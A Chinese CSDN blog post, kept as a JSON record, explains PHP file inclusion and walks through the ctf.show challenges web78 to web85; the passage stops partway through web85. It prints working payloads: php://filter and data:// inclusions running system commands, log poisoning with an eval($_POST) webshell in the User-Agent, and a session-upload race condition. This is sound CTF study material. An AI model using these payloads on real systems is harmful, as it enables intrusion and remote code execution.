{"blogid": "123886703", "writerAge": "码龄1年", "writerBlogNum": "32", "writerCollect": "27", "writerComment": "4", "writerFan": "91", "writerGrade": "2级", "writerIntegral": "340", "writerName": "ing_end", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_123886703.jpg", "writerRankTotal": "42562", "writerRankWeekly": "488822", "writerThumb": "4", "writerVisitNum": "42338", "blog_read_count": "5438", "blog_time": "于 2022-04-02 21:13:14 发布", "blog_title": "文件包含(CTF)", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"_0\"></a>文件包含</h1>\n<p>留言 连接数据库<br/> 查看留言 连接数据库<br/> 登录 连接数据库<br/> 注册 连接数据库</p>\n<p>代码的重复</p>\n<p>留言</p>\n<p>查看留言 连接数据库单独的文件</p>\n<p>登录</p>\n<p>注册</p>\n<p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。<br/> 程序开发人员都希望代码更加灵活，所以通常会把被包含的文件设置为变量，来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p>\n<p>文件上传JEG PNG JPEG GlF先上传PNG图片马，然后再包含。</p>\n<p>txt png rar</p>\n<p>把文件里面的内容当作PHP代码执行。</p>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\720c3001be8c4b71b5d6b3e5cc7697f8.png\"/></p>\n<h2><a id=\"_29\"></a><strong>文件包含产生原因：</strong></h2>\n<h3><a id=\"1web_31\"></a><strong>1.web应用实现了动态包含：</strong></h3>\n<p><img alt=\"image-20220325200649041\" src=\"..\\..\\static\\image\\66f54be08fb5cdc23dbaef7143596862.png\"/></p>\n<h3><a id=\"2_35\"></a><strong>2.动态包含的文件路径参数，客户端可控：</strong></h3>\n<p><img alt=\"image-20220325200859083\" src=\"..\\..\\static\\image\\240e8f561803e5a59c1f842296dba97d.png\"/></p>\n<p>​ 几平所有的脚本语言都会提供文件包含功能。文件包含漏洞在PHP Web Application中居多，在JSP/ASP/ASP.net程序中比较少。以PHP为例，说明文件包含漏洞。</p>\n<h2><a id=\"PHP_41\"></a><strong>PHP中的文件包含</strong></h2>\n<p><img alt=\"img\" src=\"..\\..\\static\\image\\e5ff8a025e6b9c29cc7c904989643360.png\"/></p>\n<p>*语句<br/> PHP中提供了四个文件包含的函数，四个函数之间略有区别。如下</p>\n<p>函数 区别<br/> include( ) 文件包含失败时，会产生警告，<strong>脚本会继续运行</strong>。<br/> include_once() 与include()功能相同，文件只会被包含一次。require( ) 文件包含失败时，会产生错误，<strong>直接结束脚本执行</strong>。<br/> require_once( ) 与require( )功能相同，文件只会被包含一次。</p>\n<p><img alt=\"image-20220325194627238\" src=\"..\\..\\static\\image\\1dab31317bccb14004e21c674071b7ee.png\"/></p>\n<p>inc.php被包含了两次</p>\n<p><img alt=\"image-20220325195513215\" src=\"..\\..\\static\\image\\d906c0c031af5a4f97c2b700fa2ed265.png\"/></p>\n<p><img alt=\"image-20220325195553567\" src=\"..\\..\\static\\image\\6d3c92227628da84a42b0693879e6016.png\"/></p>\n<p>inc.php被包含了一次</p>\n<p>*相关配置<br/> 文件包含是PHP的基本功能之一，有本地文件包含和远程文件包含之分(虽然php官网上不是这么解释的)。简单来说，<strong>本地文件包含</strong>就是可以读取和打开本地文件，<strong>远程文件包含</strong>（http，ftp，php伪协议）就是可以远程加载文件。我们可以通过php.ini来进行配置。如下<br/> allow_url_fopen=On/Off 本地文件包含(LFI)（开和关都可包含本地文件）<br/> allow_url_include=On/Off 远程文件包含(RFI)</p>\n<h2><a id=\"_70\"></a>文件包含示例</h2>\n<p>我们可以通过以下简单的代码来测试文件包含漏洞。准备一个fileinclude.php文件。</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'path '</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'path'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"?path=info.php\"</span> <span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>该文件会从GET 方法获取path变量，也就是文件包含路径，然后包含此文件。创建一个文件info.php，这个包含的文件的内容为phpinfo( )。</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h1><a id=\"web_78_99\"></a>web 78</h1>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-16 10:52:43\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-16 10:54:20\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>使用 include进行了文件包含</p>\n<p>构造playload：</p>\n<p>伪协议</p>\n<pre><code class=\"prism language-php\"><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.base64-encode/resource=flag.php</span>\n</code></pre>\n<p>将得到的内容解码：</p>\n<p><img alt=\"image-20220330214334348\" src=\"..\\..\\static\\image\\0cc5a9ea141dca122d7cb770d9f54e3a.png\"/></p>\n<h1><a id=\"web_79_140\"></a>web 79</h1>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-16 11:10:14\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-16 11:12:38\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/</span>\n\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>把php字符替换成???了</p>\n<p>构造payload：</p>\n<p>data协议</p>\n<pre><code>?file=data://text/plain,&lt;?=system('tac fl*');?&gt;\n</code></pre>\n<p><img alt=\"image-20220330214658059\" src=\"..\\..\\static\\image\\3c77e7bdcd058fdae024d1debeb16e25.png\"/></p>\n<p>成功得到flag</p>\n<h1><a id=\"web_80_182\"></a>web 80</h1>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p>用日志包含绕过，将执行的命令插入日志中</p>\n<p>在User-Agent插入<br/> <code>&lt;?php echo system('ls');?&gt;</code></p>\n<pre><code>?file=/var/log/nginx/access.log\n</code></pre>\n<p><img alt=\"image-20220330220349848\" src=\"..\\..\\static\\image\\67c1e7f2dfed00766247f1ca01e31207.png\"/></p>\n<h1><a id=\"web_81_210\"></a>web 81</h1>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>%0a在UA里不被解码，在浏览器可以<br/> 被替换，还是利用日志文件<br/> UA传</p>\n<pre><code>&lt;?= eval($_POST[1]);?&gt;\n</code></pre>\n<p><img alt=\"image-20220330220551869\" src=\"..\\..\\static\\image\\3b2b0abd471763570acc394fdcb88ac7.png\"/></p>\n<h1><a id=\"Web_8286_239\"></a>Web 82-86</h1>\n<pre><code class=\"prism language-php\"><span class=\"token function\">session_unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</p>\n<p>以POST的形式发包，传的文件随意</p>\n<pre><code class=\"prism language-php+HTML\">&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;form action=\"http://b19c75ee-d5d9-4a02-8379-d988199962e2.chall.ctf.show:8080/\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n    &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"2333\" /&gt;\n    &lt;input type=\"file\" name=\"file\" /&gt;\n    &lt;input type=\"submit\" value=\"submit\" /&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n&lt;?php\nsession_start();\n?&gt;\n</code></pre>\n<p><img alt=\"image-20220331112711993\" src=\"..\\..\\static\\image\\6551c7642a91c70cd968767517d8f5d7.png\"/></p>\n<p><img alt=\"image-20220331112738254\" src=\"..\\..\\static\\image\\cc09f20862b51f4afad230fb2881859f.png\"/></p>\n<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag ，PHP将会在服务器上创建一个文件：/tmp/sess_flag” ，并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马，修改如下</p>\n<p><img alt=\"image-20220331193035296\" src=\"..\\..\\static\\image\\b7818ba1b9df77a505b832db1f63e6b1.png\"/></p>\n<p>因为在上面这个页面添加的ID值是flag，所以传参</p>\n<pre><code>?file=/tmp/sess_flag\n</code></pre>\n<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>\n<p><img alt=\"image-20220331193109424\" src=\"..\\..\\static\\image\\a40903e5470b5559caa6a8ac0869d9a0.png\"/></p>\n<p><img alt=\"image-20220331193222299\" src=\"..\\..\\static\\image\\e0e3a1abf71c0b3092b78ef321cd22df.png\"/></p>\n<p>进行爆破得到flag</p>\n<p><img alt=\"image-20220331194540857\" src=\"..\\..\\static\\image\\84bac8ae760f14e3380c3d2507e58cf2.png\"/></p>\n<h2><a id=\"WEB83_304\"></a>WEB83</h2>\n<pre><code class=\"prism language-php\">Warning<span class=\"token punctuation\">:</span> <span class=\"token function\">session_destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token class-name return-type\">Trying</span> to destroy uninitialized session\n in <span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>www<span class=\"token operator\">/</span>html<span class=\"token operator\">/</span>index<span class=\"token operator\">.</span>php on line <span class=\"token number\">14</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php\n<span class=\"token function\">session_unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">session_destroy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>**分析：**多了两个函数</p>\n<blockquote>\n<p>session_unset()：<br/> 释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的session_id</p>\n<p>session_destroy()：<br/> 删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留， 也不会重置会话 cookie</p>\n</blockquote>\n<p>这两个函数都将有关session的东西都删除了，我们无法进行session文件包含的。但是：我们的脚本或者bp仍然能够进行包含。原因在于多线程竞争的含义</p>\n<p>知识点：</p>\n<blockquote>\n<p>什么是多线程竞争</p>\n<p>线程是非独立的，同一个进程里线程是数据共享的，当当各个线程访问数据资源时会出现竞争状态即:</p>\n<p>数据几乎同步会被多个线程占用，造成数据混乱，即所谓的线程不安全 。</p>\n<p>这样，因为在执行session_unset()与执行session_destroy()的时候有间隔，他们与include($file)直接也会有间隔，我们其中的一个线程在删除session文件，而另一个线程刚刚又创建了一个session文件，然后前面的线程又开始包含，那么还是能够正常包含。</p>\n<p>怎么解决多线程竞争问题?—锁</p>\n<p>锁的好处: 确保了某段关键代码(共享数据资源)只能由一个线程从头到尾完整地执行能解决多线程资 源竞争下的原子操作问题。</p>\n<p>锁的坏处: 阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下 降了</p>\n<p>锁的致命问题: 死锁</p>\n</blockquote>\n<p>方法：同82</p>\n<h2><a id=\"WEB84_358\"></a>WEB84</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"rm -rf /tmp/*\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre>\n<p>system 这句话会删除/tem/下面的所有文件，且不能恢复</p>\n<p>-f：强制删除文件或目录；<br/> -r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</p>\n<p>还是web82的方法</p>\n<h2><a id=\"WEB85_385\"></a>WEB85</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"data\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"???\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$file</span><span class=\"token 